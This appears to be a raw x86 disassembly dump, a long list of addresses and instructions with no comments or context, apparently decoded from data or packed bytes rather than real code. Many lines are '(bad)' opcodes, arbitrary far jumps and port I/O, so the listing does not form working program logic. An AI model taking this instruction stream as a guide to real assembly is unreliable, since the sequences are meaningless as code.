  418443:	aas    
  418444:	cli    
  418445:	jno    0x41845d
  418447:	or     al,0x55
  418449:	add    bh,bh
  41844b:	loop   0x4183e3
  41844d:	in     eax,0xc7
  41844f:	xchg   ebx,eax
  418450:	cmp    DWORD PTR [ecx-0x33],0x30020d47
  418457:	pop    ss
  418458:	jmp    0x22fd:0x5209eeb6
  41845f:	dec    ecx
  418460:	sub    eax,ebx
  418462:	add    al,0xeb
  418464:	inc    ecx
  418465:	fwait
  418466:	fwait
  418467:	fs rcr esp,0x5d
  41846b:	jnp    0x418440
  41846d:	xor    DWORD PTR [ebp+0x778098d4],ebp
  418473:	lock adc ecx,DWORD PTR [ebp+0x64]
  418477:	cmp    al,0xf7
  418479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41847a:	sub    BYTE PTR [edx-0x7a],cl
  41847d:	std    
  41847e:	push   esi
  41847f:	lea    edx,[esi+0x1f2fefec]
  418485:	jmp    0x3b3d299f
  41848a:	push   eax
  41848b:	jns    0x41850a
  41848d:	pop    ecx
  41848e:	and    al,0xba
  418490:	(bad)  
  418491:	fcom   QWORD PTR [esp+ebp*2-0xb]
  418495:	xchg   edi,eax
  418496:	enter  0x6550,0x12
  41849a:	aad    0xd
  41849c:	int3   
  41849d:	mov    ebx,0x9f11a331
  4184a2:	adc    DWORD PTR [esi-0x72],0x1b
  4184a6:	jecxz  0x4184cb
  4184a8:	xchg   ecx,eax
  4184a9:	shl    dl,0x9b
  4184ac:	fisub  DWORD PTR [edi+ecx*8+0x3e]
  4184b0:	mov    al,0x32
  4184b2:	xchg   esp,eax
  4184b3:	pop    esi
  4184b4:	push   ecx
  4184b5:	stos   DWORD PTR es:[edi],eax
  4184b6:	and    eax,0x277fcd8e
  4184bb:	adc    BYTE PTR [eax],0x6b
  4184be:	(bad)  
  4184bf:	dec    ebx
  4184c0:	test   BYTE PTR [ebx-0x67],bl
  4184c3:	call   0x14af:0x472ad997
  4184ca:	les    ecx,FWORD PTR [ebx+esi*1]
  4184cd:	in     al,0xf0
  4184cf:	cs sti 
  4184d1:	and    al,0x14
  4184d3:	push   ebp
  4184d4:	outs   dx,DWORD PTR ds:[esi]
  4184d5:	or     eax,0x7a4e12b6
  4184da:	mov    ebp,0xe160ae56
  4184df:	loope  0x418550
  4184e1:	mov    edx,0xe5c89004
  4184e6:	fldcw  WORD PTR [ecx]
  4184e8:	or     DWORD PTR [ebp+0x6c],ecx
  4184eb:	push   DWORD PTR [ebx+ecx*8+0x64]
  4184ef:	or     al,0x4
  4184f1:	xlat   BYTE PTR ds:[ebx]
  4184f2:	mov    eax,0x7ef933db
  4184f7:	clc    
  4184f8:	call   0x7355:0x9bbbdd13
  4184ff:	or     dh,BYTE PTR [edx-0x611e385a]
  418505:	popf   
  418506:	and    esp,esi
  418508:	icebp  
  418509:	mov    cl,0xa
  41850b:	loope  0x4184aa
  41850d:	ins    DWORD PTR es:[edi],dx
  41850e:	and    BYTE PTR [eax-0x4e],dl
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	xor    al,bh
  418582:	(bad)  
  418584:	mov    DWORD PTR [ecx],0x1050001
  41858a:	add    BYTE PTR [eax],al
  41858c:	adc    DWORD PTR [edi+0xd442e18],0x6f2487ef
  418596:	loope  0x41860b
  418598:	rcl    esi,0xfa
  41859b:	int    0x93
  41859d:	stos   DWORD PTR es:[edi],eax
  41859e:	test   ch,ch
  4185a0:	aad    0xd7
  4185a2:	js     0x4185ec
  4185a4:	add    eax,0xcd08aa74
  4185a9:	xchg   ebp,eax
  4185aa:	shl    BYTE PTR [ecx+0x46],cl
  4185ad:	or     ebx,esi
  4185af:	and    esi,DWORD PTR [ebx+0x6828a92a]
  4185b5:	xor    DWORD PTR [ebx+0x76],0xffffffb3
  4185b9:	cdq    
  4185ba:	dec    edx
  4185bb:	js     0x41856c
  4185bd:	cmc    
  4185be:	pop    eax
  4185bf:	pop    esp
  4185c0:	cmp    al,dh
  4185c2:	sub    bl,BYTE PTR [ecx]
  4185c4:	jp     0x41861b
  4185c6:	pusha  
  4185c7:	and    dl,0x56
  4185ca:	or     DWORD PTR [eax+ecx*2-0x174843be],ebp
  4185d1:	pop    ebx
  4185d2:	pusha  
  4185d3:	fisttp WORD PTR [edi+0x48]
  4185d6:	repz and eax,0xa18aff3f
  4185dc:	inc    esi
  4185dd:	sbb    edi,DWORD PTR [eax-0x53]
  4185e0:	test   BYTE PTR [edi-0x5f2fa95f],cl
  4185e6:	pop    ebp
  4185e7:	or     ch,ah
  4185e9:	fidivr WORD PTR [ecx+0x6c247c80]
  4185ef:	retf   0x1e04
  4185f2:	sti    
  4185f3:	adc    ah,bl
  4185f5:	add    cl,BYTE PTR ds:0x1e10df42
  4185fb:	push   0x4187724a
  418600:	test   al,0x4e
  418602:	and    al,0x4f
  418604:	out    0x29,al
  418606:	sub    al,0x5d
  418608:	add    cl,BYTE PTR [edi+esi*2]
  41860b:	mov    ebx,0x26d40a44
  418610:	dec    esi
  418611:	xor    al,0x9e
  418613:	pop    esp
  418614:	pop    ebx
  418615:	mov    ebp,0x21dbc3a0
  41861a:	push   ss
  41861b:	jmp    0x6c3b:0x9d09db00
  418622:	mul    ecx
  418624:	pop    ebx
  418625:	and    ch,BYTE PTR [edi+0x4b]
  418628:	jns    0x418687
  41862a:	inc    edx
  41862b:	cli    
  41862c:	sbb    DWORD PTR [edx],esp
  41862e:	cs stos BYTE PTR es:[edi],al
  418630:	dec    ebp
  418631:	or     DWORD PTR [edx],edx
  418633:	sub    eax,0xf1729c8a
  418638:	les    eax,FWORD PTR [ecx+0x614c469e]
  41863e:	out    dx,eax
  41863f:	out    dx,al
  418640:	adc    al,0x7
  418642:	jecxz  0x418687
  418644:	or     DWORD PTR [ecx-0x7a5cebb8],ecx
  41864a:	enter  0x62c3,0x78
  41864e:	aad    0x14
  418650:	cdq    
  418651:	loope  0x418641
  418653:	ret    0x92e4
  418656:	mov    dh,bl
  418658:	mov    al,ds:0xa4e1941c
  41865d:	(bad)  
  41865e:	in     al,dx
  41865f:	(bad)  
  418660:	jl     0x418626
  418662:	ds (bad) 
  418664:	or     esp,ecx
  418666:	push   esp
  418667:	mov    esi,0xe0380f82
  41866c:	fild   QWORD PTR [esi-0x41]
  41866f:	in     eax,dx
  418670:	enter  0x3437,0x38
  418674:	jp     0x418607
  418676:	xor    al,0x45
  418678:	rcr    DWORD PTR [ecx+0x6e],1
  41867b:	xor    al,0x47
  41867d:	lock jbe 0x4186a8
  418680:	cmp    al,dl
  418682:	inc    ebp
  418683:	cmp    esi,DWORD PTR [edi]
  418685:	jb     0x418671
  418687:	cwde   
  418688:	cmp    ebx,DWORD PTR [ebp+0x373ec466]
  41868e:	es ret 
  418690:	mov    es,WORD PTR [eax]
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	add    al,dl
  418702:	push   eax
  418703:	sub    ecx,esp
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0xcf000001,al
  41870d:	mov    cl,0x9
  41870f:	and    BYTE PTR [esi-0x2920b4df],0xe8
  418716:	inc    ebx
  418717:	js     0x41877b
  418719:	cmp    DWORD PTR [edi],esi
  41871b:	jmp    0xa609c0ae
  418720:	into   
  418721:	ja     0x418726
  418723:	dec    ecx
  418724:	loope  0x418777
  418726:	nop
  418727:	inc    edi
  418728:	test   al,0xa1
  41872a:	pop    edi
  41872b:	cwde   
  41872c:	mov    ds:0xb246cf0,al
  418731:	addr16 xor eax,0xc01ad40a
  418737:	sahf   
  418738:	sub    esp,ecx
  41873a:	mov    al,0x49
  41873c:	lahf   
  41873d:	pop    es
  41873e:	cmp    eax,0xa52e69dc
  418743:	and    BYTE PTR [ebp-0x2f],ah
  418746:	jb     0x41870f
  418748:	mov    dh,0x71
  41874a:	iret   
  41874b:	std    
  41874c:	cmp    bl,BYTE PTR [edi]
  41874e:	xchg   esp,eax
  41874f:	inc    eax
  418750:	xor    dh,BYTE PTR [ecx-0x3e420581]
  418756:	xor    eax,eax
  418758:	call   0xdb57:0x95fc9900
  41875f:	push   esi
  418760:	inc    esi
  418761:	or     BYTE PTR [eax],bh
  418763:	dec    DWORD PTR [ecx+0x6d]
  418766:	shl    BYTE PTR [eax],cl
  418768:	ret    0x6378
  41876b:	xor    eax,0x5ccdc1e2
  418770:	jno    0x418762
  418772:	jmp    0x41877c
  418774:	sbb    BYTE PTR [eax-0xa],bh
  418777:	stos   BYTE PTR es:[edi],al
  418778:	mov    ds:0x7e622c24,eax
  41877d:	xor    eax,0xa66f4db5
  418782:	ss cmp ecx,0x7b
  418786:	xchg   BYTE PTR [ecx-0x10],ah
  418789:	outs   dx,DWORD PTR ds:[esi]
  41878a:	rcr    DWORD PTR [ebx+0x7e],1
  41878d:	gs push esp
  41878f:	fs push ebp
  418791:	dec    ebx
  418792:	fadd   QWORD PTR ds:0x82bf21a9
  418798:	jle    0x4187b2
  41879a:	pop    ss
  41879b:	test   al,0x4f
  41879d:	fild   WORD PTR [ebx+edi*2-0x25d3f56b]
  4187a4:	test   BYTE PTR [ecx],0x16
  4187a7:	shl    BYTE PTR [ecx-0x7f3c52ff],cl
  4187ad:	pop    eax
  4187ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187af:	call   0x2978b4b6
  4187b4:	xchg   ebp,eax
  4187b5:	xlat   BYTE PTR ds:[ebx]
  4187b6:	mov    DWORD PTR [eax],esp
  4187b8:	in     al,dx
  4187b9:	pusha  
  4187ba:	and    eax,0xfa70fe31
  4187bf:	in     eax,dx
  4187c0:	or     DWORD PTR [ebx-0x2c],edx
  4187c3:	xchg   ebx,eax
  4187c4:	lds    edi,FWORD PTR [esi-0x3b]
  4187c7:	sahf   
  4187c8:	push   esp
  4187c9:	push   edx
  4187ca:	fcomp  DWORD PTR [edi+ebx*2]
  4187cd:	xchg   ebx,eax
  4187ce:	pop    eax
  4187cf:	lea    ebp,[edx-0x9]
  4187d2:	lea    ebp,[ebx-0x22]
  4187d5:	fcom   st(4)
  4187d7:	je     0x4187d2
  4187d9:	iret   
  4187da:	sub    dl,ah
  4187dc:	cmp    bh,ah
  4187de:	jmp    ecx
  4187e0:	ins    DWORD PTR es:[edi],dx
  4187e1:	jne    0x41877d
  4187e3:	jmp    0x4187d6
  4187e5:	fstp   st(3)
  4187e7:	lock adc dl,ah
  4187ea:	and    dl,dh
  4187ec:	nop
  4187ed:	mov    edi,ebp
  4187ef:	fs mov bl,0x3
  4187f2:	inc    esi
  4187f3:	das    
  4187f4:	jecxz  0x4187f2
  4187f6:	mov    eax,ds:0x47f50436
  4187fb:	xchg   esi,eax
  4187fc:	jmp    0x4187e7
  4187fe:	mov    ecx,0xc06873fa
  418803:	bound  ecx,QWORD PTR [edi]
  418805:	enter  0xd457,0xb2
  418809:	dec    edx
  41880a:	ss stos BYTE PTR es:[edi],al
  41880c:	shl    bh,0xc2
  41880f:	adc    ah,bl
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi+0x729c3acd]
  418881:	mov    eax,DWORD PTR [ebp+0x4]
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0x82000001
  41888d:	pop    ebx
  41888e:	or     DWORD PTR [edi-0x4],eax
  418891:	aad    0x2b
  418893:	mov    BYTE PTR [ecx-0x67b85dbe],0x20
  41889a:	jo     0x41886b
  41889c:	popa   
  41889d:	stos   BYTE PTR es:[edi],al
  41889e:	enter  0xf940,0x43
  4188a2:	arpl   WORD PTR [eax+0x49],cx
  4188a5:	or     ecx,DWORD PTR [ebp+0x6f]
  4188a8:	dec    eax
  4188a9:	ins    DWORD PTR es:[di],dx
  4188ab:	xchg   esi,eax
  4188ac:	push   0xffffff8a
  4188ae:	fwait
  4188af:	out    dx,al
  4188b0:	popa   
  4188b1:	jp     0x4188f4
  4188b3:	jno    0x41890e
  4188b5:	mov    esp,0xeb3145f0
  4188ba:	adc    eax,0x3db08273
  4188bf:	lahf   
  4188c0:	cmp    edx,eax
  4188c2:	inc    ebx
  4188c3:	test   esp,0xfd1eb318
  4188c9:	xor    BYTE PTR [ebx],0xcd
  4188cc:	lock (bad) 
  4188ce:	and    ebx,edx
  4188d0:	jmp    0x6ef7:0x601e06b2
  4188d7:	or     BYTE PTR gs:[ebx],bl
  4188da:	(bad)  
  4188dc:	xlat   BYTE PTR ds:[ebx]
  4188dd:	and    al,0x11
  4188df:	not    BYTE PTR [ebp+0x46af39b5]
  4188e5:	pop    esp
  4188e6:	adc    DWORD PTR [ecx-0x5b0b1058],ebp
  4188ec:	sbb    edi,DWORD PTR [esi+0x5d52ce82]
  4188f2:	cmp    dl,BYTE PTR [edx-0x58a964f5]
  4188f8:	cmp    esi,DWORD PTR [esi+0x71]
  4188fb:	div    BYTE PTR [eax-0x56b45e93]
  418901:	not    BYTE PTR ds:0xdb7cfc
  418907:	jns    0x41896a
  418909:	aaa    
  41890a:	and    dl,bl
  41890c:	mov    eax,ds:0x7cefd1bc
  418911:	stos   DWORD PTR es:[edi],eax
  418912:	scas   al,BYTE PTR es:[edi]
  418913:	xchg   ecx,eax
  418914:	and    dl,ch
  418916:	scas   eax,DWORD PTR es:[edi]
  418917:	call   0xfb3:0x2b522f67
  41891e:	xlat   BYTE PTR ds:[ebx]
  41891f:	add    ah,BYTE PTR [edi]
  418921:	imul   edx,esp,0xffffff86
  418924:	jle    0x418966
  418926:	adc    dh,ch
  418928:	daa    
  418929:	enter  0x62a3,0x47
  41892d:	mov    al,ds:0xab37e7e5
  418932:	ja     0x41891a
  418934:	(bad)  
  418936:	push   esi
  418937:	mov    esi,0x1053c522
  41893c:	sbb    ebp,DWORD PTR [ebp-0xfc7a2e2]
  418942:	aaa    
  418943:	mov    edx,0x27c5808b
  418948:	pop    edx
  418949:	jns    0x418938
  41894b:	leave  
  41894c:	retf   0x60ed
  41894f:	test   DWORD PTR [edx],edx
  418951:	dec    ecx
  418952:	sub    eax,0x11ff1dd
  418957:	dec    si
  418959:	gs xor ebp,eax
  41895c:	sbb    bh,BYTE PTR [edx+0x525655c]
  418962:	ins    BYTE PTR es:[edi],dx
  418963:	push   ebx
  418964:	cld    
  418965:	cwde   
  418966:	shl    DWORD PTR [esi+0x20],0xb6
  41896a:	outs   dx,DWORD PTR ds:[esi]
  41896b:	fs nop
  41896d:	xchg   ecx,eax
  41896e:	leave  
  41896f:	scas   al,BYTE PTR es:[edi]
  418970:	mov    cl,0xfb
  418972:	pop    edx
  418973:	or     BYTE PTR [ecx],ch
  418975:	xchg   ecx,eax
  418976:	inc    ebp
  418977:	jle    0x4189af
  418979:	mov    edi,0x763d5ed1
  41897e:	test   DWORD PTR [ebp+edi*8-0x3e4f7c76],ebx
  418985:	pop    ebx
  418986:	pop    esp
  418987:	mov    BYTE PTR [ebx+0x14],ch
  41898a:	stc    
  41898b:	int3   
  41898c:	cwde   
  41898d:	pop    edx
  41898e:	sbb    DWORD PTR [ebp+ecx*4+0x0],edi
	...
  4189f2:	add    BYTE PTR [eax],al
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xbbec2e69
  418a03:	jmp    0x428ede
  418a08:	add    eax,0xeb000001
  418a0d:	hlt    
  418a0e:	div    BYTE PTR [eax+0x11]
  418a11:	pushf  
  418a12:	fs push 0xffffff8f
  418a15:	push   ecx
  418a16:	outs   dx,DWORD PTR ds:[esi]
  418a17:	add    esi,DWORD PTR [ebp-0x7dac0190]
  418a1d:	jo     0x418a0b
  418a1f:	adc    al,0xc5
  418a21:	push   cs
  418a22:	or     BYTE PTR [ebx+0x1c7fded],al
  418a28:	retf   0xeb3e
  418a2b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  418a2d:	mov    ds,WORD PTR [esi+0x7d6a3675]
  418a33:	das    
  418a34:	shl    esp,1
  418a36:	shr    BYTE PTR ds:0x392159a8,cl
  418a3c:	sub    eax,0x6589b52
  418a41:	aaa    
  418a42:	dec    eax
  418a43:	pusha  
  418a44:	lds    edi,FWORD PTR [eax+0x18]
  418a47:	call   0xe93e:0x6ea5f079
  418a4e:	(bad)  
  418a4f:	adc    edi,DWORD PTR [ebx]
  418a51:	mov    edi,0x38976934
  418a56:	mov    esp,0x3a45e920
  418a5b:	xor    ch,BYTE PTR [edi+0x42b7239e]
  418a61:	les    esp,FWORD PTR [esi+0x3aeb6c82]
  418a67:	jb     0x418aa2
  418a69:	jo     0x418a12
  418a6b:	repnz (bad)
  418a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a6f:	xchg   edi,eax
  418a70:	es jns 0x418aeb
  418a73:	or     dh,bh
  418a75:	int    0x0
  418a77:	fucomip st,st(0)
  418a79:	mov    dl,0x41
  418a7b:	xchg   edx,eax
  418a7c:	mov    BYTE PTR [edx+0x4e],dh
  418a7f:	push   ebp
  418a80:	xchg   edx,eax
  418a81:	jecxz  0x418a2a
  418a83:	inc    eax
  418a84:	mov    ecx,0x5734210d
  418a89:	cmp    DWORD PTR [ecx+0x68],ecx
  418a8c:	(bad)  
  418a8e:	and    DWORD PTR [edi-0x3c9d3f1c],0xffffffed
  418a95:	sbb    BYTE PTR [ecx-0xa],0x50
  418a99:	rol    BYTE PTR [edi-0x6da7856a],cl
  418a9f:	enter  0xa285,0x24
  418aa3:	das    
  418aa4:	in     eax,dx
  418aa5:	pop    ebp
  418aa6:	or     ecx,edx
  418aa8:	scas   al,BYTE PTR es:[edi]
  418aa9:	xchg   edi,eax
  418aaa:	adc    dl,BYTE PTR [esi-0x7de93907]
  418ab0:	add    ah,dh
  418ab2:	mov    cl,0x3b
  418ab4:	inc    eax
  418ab5:	mov    eax,ds:0x9b9621ee
  418aba:	mov    bh,0xe0
  418abc:	pop    ebp
  418abd:	mov    ebx,0xebd3d8cd
  418ac2:	cmp    al,BYTE PTR [eax-0x46]
  418ac5:	retf   0x1575
  418ac8:	or     BYTE PTR [eax],dh
  418aca:	pusha  
  418acb:	mov    ebx,0xaa14730e
  418ad0:	adc    eax,DWORD PTR [edx-0x23]
  418ad3:	jnp    0x418aa8
  418ad5:	jp     0x418b41
  418ad7:	js     0x418a63
  418ad9:	es inc eax
  418adb:	and    eax,0x3aaa4f02
  418ae0:	pop    es
  418ae1:	jle    0x418a9a
  418ae3:	pop    ss
  418ae4:	or     BYTE PTR [ebx],ch
  418ae6:	outs   dx,BYTE PTR ds:[esi]
  418ae7:	dec    ebx
  418ae8:	jmp    0xb2c6b44b
  418aed:	addr16 xchg ebx,eax
  418aef:	sub    cl,al
  418af1:	sbb    eax,0x792fd869
  418af6:	push   cs
  418af7:	inc    ecx
  418af8:	frstor [ebx-0x54f27863]
  418afe:	mov    bh,BYTE PTR [ecx]
  418b00:	in     al,0xbb
  418b02:	imul   ebx,edi,0x5936cf81
  418b08:	call   0xd891:0x469d84c
  418b0f:	sbb    al,0xf1
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x66
  418b81:	mov    esp,0x5dbd42c
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    eax,0x13000001
  418b8d:	cmp    DWORD PTR es:[ebx],edi
  418b90:	sbb    eax,0x97659bf7
  418b95:	xor    al,0x46
  418b97:	sar    DWORD PTR [eax+0x14],1
  418b9a:	push   ss
  418b9b:	retf   0x4a81
  418b9e:	out    dx,eax
  418b9f:	rcl    DWORD PTR [ebp+edi*8-0x38],1
  418ba3:	gs icebp 
  418ba5:	pop    ebp
  418ba6:	in     eax,dx
  418ba7:	mov    esp,0x6c8b4ba6
  418bac:	(bad)  
  418bad:	push   eax
  418bae:	out    0x1c,eax
  418bb0:	(bad)  
  418bb1:	push   ebx
  418bb2:	dec    edx
  418bb3:	ja     0x418b6b
  418bb5:	(bad)  
  418bb6:	in     al,0x80
  418bb8:	sbb    al,0x5c
  418bba:	and    dl,dl
  418bbc:	lock bound ebx,QWORD PTR ds:[ebp+0x7fd2ebe4]
  418bc4:	cwde   
  418bc5:	cmp    BYTE PTR ds:0xb34365d7,bl
  418bcb:	dec    esp
  418bcc:	aaa    
  418bcd:	(bad)  
  418bce:	rol    DWORD PTR [eax],cl
  418bd0:	sbb    BYTE PTR [eax+0x54],bh
  418bd3:	fldcw  WORD PTR [esi-0x9ffc02]
  418bd9:	and    ch,BYTE PTR [edx]
  418bdb:	jge    0x418b5f
  418bdd:	loopne 0x418c5e
  418bdf:	inc    edx
  418be0:	jle    0x418b9b
  418be2:	adc    al,0xd2
  418be4:	repz fmul QWORD PTR [edx+ebp*1+0x16]
  418be9:	sub    eax,0x9b19c637
  418bee:	add    al,0xae
  418bf0:	iret   
  418bf1:	je     0x418bf2
  418bf3:	pop    eax
  418bf4:	fsub   DWORD PTR [ecx-0x4c]
  418bf7:	dec    edi
  418bf8:	outs   dx,BYTE PTR ds:[esi]
  418bf9:	out    0x9f,eax
  418bfb:	mov    al,ds:0x995328be
  418c00:	outs   dx,BYTE PTR ds:[esi]
  418c01:	add    BYTE PTR [eax-0x7b],dh
  418c04:	mov    ah,0x51
  418c06:	mov    ebx,esi
  418c08:	scas   al,BYTE PTR es:[edi]
  418c09:	es jae 0x418bda
  418c0c:	mov    ds:0xc35d0f05,eax
  418c11:	inc    ecx
  418c12:	ret    0x2c93
  418c15:	stos   BYTE PTR es:[edi],al
  418c16:	add    DWORD PTR [ebx-0x76],ebp
  418c19:	data16 jne 0x418c8c
  418c1c:	inc    ebp
  418c1d:	fadd   DWORD PTR [ebp+0x29]
  418c20:	fidivr WORD PTR [ecx]
  418c22:	(bad)  
  418c23:	scas   al,BYTE PTR es:[edi]
  418c24:	or     BYTE PTR [ebp*2+0x466d1ef3],bl
  418c2b:	iret   
  418c2c:	ret    
  418c2d:	f2xm1  
  418c2f:	mov    ah,0x71
  418c31:	pop    es
  418c32:	mov    DWORD PTR [edx],ecx
  418c34:	jg     0x418c02
  418c36:	dec    ebp
  418c37:	push   esi
  418c38:	in     al,dx
  418c39:	sbb    eax,0x86e01418
  418c3e:	add    BYTE PTR [eax+0x53],dl
  418c41:	sbb    al,BYTE PTR [ecx+ebx*1+0xb409561]
  418c48:	leave  
  418c49:	add    al,0x27
  418c4b:	and    ebp,ecx
  418c4d:	and    al,0x7d
  418c4f:	sbb    al,0x86
  418c51:	repnz sub edx,ecx
  418c54:	leave  
  418c55:	xchg   edi,eax
  418c56:	jbe    0x418c7b
  418c58:	retf   
  418c59:	ror    bl,0x3c
  418c5c:	out    0xd3,eax
  418c5e:	inc    ebp
  418c5f:	xor    edi,DWORD PTR [eax-0x57]
  418c62:	out    dx,eax
  418c63:	pop    ecx
  418c64:	fimul  DWORD PTR [eax+0x43011547]
  418c6a:	fbstp  TBYTE PTR [eax+0x1a9df3cd]
  418c70:	sub    DWORD PTR [edi+ecx*1-0x6a],esp
  418c74:	cdq    
  418c75:	jne    0x418c64
  418c77:	sbb    edx,DWORD PTR [ebp+0xf]
  418c7a:	jle    0x418ce1
  418c7c:	sbb    esp,DWORD PTR [esi+ecx*4+0x10]
  418c80:	aad    0xc4
  418c82:	jmp    0x3fe5:0x833ad52c
  418c89:	pop    ecx
  418c8a:	xlat   BYTE PTR ds:[ebx]
  418c8b:	push   ebp
  418c8c:	mov    eax,0x81d57a3f
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    BYTE PTR [esi+ebp*1-0x5e],cl
  418d03:	mov    esi,0x106e0
  418d08:	add    eax,0xa2000001
  418d0d:	popa   
  418d0e:	ds xchg ecx,eax
  418d10:	jp     0x418cda
  418d12:	sub    DWORD PTR [ebp+0x8627d36],esp
  418d18:	popa   
  418d19:	mov    eax,ds:0xeae05d55
  418d1e:	mov    ch,0x69
  418d20:	xchg   edi,eax
  418d21:	pop    esp
  418d23:	or     BYTE PTR [esi+0x8399aca],0xf3
  418d2a:	stos   DWORD PTR es:[edi],eax
  418d2b:	daa    
  418d2c:	xchg   ecx,eax
  418d2d:	and    dl,BYTE PTR [edi]
  418d2f:	cs mov cl,0x5b
  418d32:	cli    
  418d33:	call   0x96994c4c
  418d38:	ds jecxz 0x418d7d
  418d3b:	leave  
  418d3c:	lea    edx,[esi-0x1f]
  418d3f:	(bad)  
  418d40:	jg     0x418d35
  418d42:	outs   dx,BYTE PTR ds:[si]
  418d44:	fwait
  418d45:	mov    ebx,0x22cb491a
  418d4a:	fidivr WORD PTR [edx+0x60]
  418d4d:	daa    
  418d4e:	bound  esp,QWORD PTR [ebx+0x18]
  418d51:	outs   dx,BYTE PTR ds:[esi]
  418d52:	imul   ecx,esp,0x42925ec7
  418d58:	pop    ss
  418d59:	lds    ecx,FWORD PTR [ebp+0x63]
  418d5c:	loop   0x418d8f
  418d5e:	pop    ebp
  418d5f:	pop    esp
  418d60:	loop   0x418ceb
  418d62:	push   edi
  418d63:	clc    
  418d64:	push   0x6cb9081c
  418d69:	stos   BYTE PTR es:[edi],al
  418d6a:	dec    edx
  418d6b:	xchg   BYTE PTR [ebp+eiz*8+0x7f44b6ab],dl
  418d72:	les    edi,FWORD PTR [ecx]
  418d74:	sar    BYTE PTR [edi],0x74
  418d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d78:	or     bh,ah
  418d7a:	ds xchg dh,bh
  418d7d:	ror    DWORD PTR [esi+edi*1],1
  418d80:	cmp    cl,bl
  418d82:	daa    
  418d83:	mov    ebp,0xe699bea0
  418d88:	dec    ebp
  418d89:	(bad)  
  418d8a:	in     eax,0x4b
  418d8c:	std    
  418d8d:	aas    
  418d8e:	aas    
  418d8f:	mov    bl,0x6e
  418d91:	lock in al,0xb2
  418d94:	fcom   QWORD PTR [eax]
  418d96:	inc    esi
  418d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d98:	fmul   QWORD PTR [edi]
  418d9a:	imul   edi
  418d9c:	ja     0x418d91
  418d9e:	sbb    eax,0xf1e88f43
  418da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da4:	jmp    0xf668:0xbf5295b
  418dab:	cs sbb eax,0x7cc9e1f2
  418db1:	cdq    
  418db2:	fld    TBYTE PTR [eax-0x7676e4c1]
  418db8:	or     eax,0x22101bbf
  418dbd:	mov    ebp,0xdd213fab
  418dc3:	pop    esp
  418dc4:	xchg   ebx,eax
  418dc5:	mov    cl,0x5d
  418dc7:	fstp   QWORD PTR [ecx]
  418dc9:	xchg   edx,eax
  418dca:	cmp    bl,bh
  418dcc:	sbb    BYTE PTR [esi+0x77],bl
  418dcf:	das    
  418dd0:	icebp  
  418dd1:	xor    ch,BYTE PTR [edx+0x66]
  418dd4:	shl    DWORD PTR [edi+ebx*4+0x53b9fdb],0xc4
  418ddc:	ss aas 
  418dde:	add    ebx,DWORD PTR [eax-0x28be3ee3]
  418de4:	dec    esp
  418de5:	xor    ebp,DWORD PTR [edx]
  418de7:	mov    WORD PTR [eax],es
  418de9:	pop    esi
  418dea:	int    0xc2
  418dec:	mov    al,gs:0xe78d61ae
  418df2:	and    al,0x51
  418df4:	and    al,0xc2
  418df6:	cmp    DWORD PTR [esi-0x3b],esi
  418df9:	sub    ebx,esp
  418dfb:	int3   
  418dfc:	ds cmp eax,0x82c8b8aa
  418e02:	xor    eax,0x5e7caad9
  418e07:	or     DWORD PTR [esi+0x66],edi
  418e0a:	pushf  
  418e0b:	xor    ecx,ebx
  418e0d:	xor    edi,DWORD PTR [edx]
  418e0f:	ins    BYTE PTR es:[edi],dx
  418e10:	or     al,0x0
	...
  418e72:	add    BYTE PTR [eax],al
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x14]
  418e81:	pop    esi
  418e82:	and    BYTE PTR [ecx-0x1b],dh
  418e85:	pop    es
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0x91000001
  418e8d:	mov    eax,0xd84ba21b
  418e92:	(bad)  
  418e93:	fwait
  418e94:	and    ch,BYTE PTR [edi+0x2d]
  418e97:	test   DWORD PTR [esi],esi
  418e99:	imul   ecx,DWORD PTR [edx+0x1d],0x5c
  418e9d:	iret   
  418e9e:	(bad)  
  418e9f:	mov    ebp,0x78fcaa4a
  418ea4:	cld    
  418ea5:	mov    ecx,0x82076e41
  418eaa:	mov    ebx,0xfaf5e456
  418eaf:	retf   0xeb30
  418eb2:	mov    ch,BYTE PTR [esi-0x3a6dedda]
  418eb8:	ds xor ch,0x72
  418ebc:	stos   BYTE PTR es:[edi],al
  418ebd:	xchg   ebx,esp
  418ebf:	fild   QWORD PTR [ebp-0xdf67c2a]
  418ec5:	ror    BYTE PTR [ecx+0x4014caec],1
  418ecb:	in     al,0x30
  418ecd:	fimul  DWORD PTR [edi]
